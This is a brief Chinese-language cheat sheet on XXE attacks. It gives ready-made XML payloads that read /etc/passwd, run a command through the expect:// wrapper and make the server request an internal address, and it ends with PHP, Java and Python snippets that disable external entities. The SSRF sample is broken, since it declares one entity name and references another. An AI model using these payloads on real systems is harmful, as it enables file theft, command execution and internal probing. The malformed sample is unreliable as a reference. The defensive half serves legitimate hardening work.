## 1.XXE PayLoad
#### 读取任意文件 
```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
<name>&xxe;</name>
</root>	

```

#### RCE
```
<?xml version="1.0"?>
<!DOCTYPE GVI [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<catalog>
   <core id="test101">
      <description>&xxe;</description>
   </core>
</catalog>
```

#### SSRF
```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE ANY [
<!ENTITY content SYSTEM "http://10.165.89.150:88">]>
<root>
<name>&xxe;</name>
</root>	
```

## 2.xxe防御
#### php
```
libxml_disable_entity_loader(true);
```

#### java
```
SAXReader reader = new SAXReader();
// 是否包含外部生成的实体。当正在解析文档时为只读属性，未解析文档的状态下为读写
reader.setFeature("http://xml.org/sax/features/external-general-entities", false);
// 是否包含外部的参数，包括外部DTD子集。当正在解析文档时为只读属性，未解析文档的状态下为读写。
reader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
Document document = reader.read(xml);
```

#### python
```
from lxml import etree
xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
```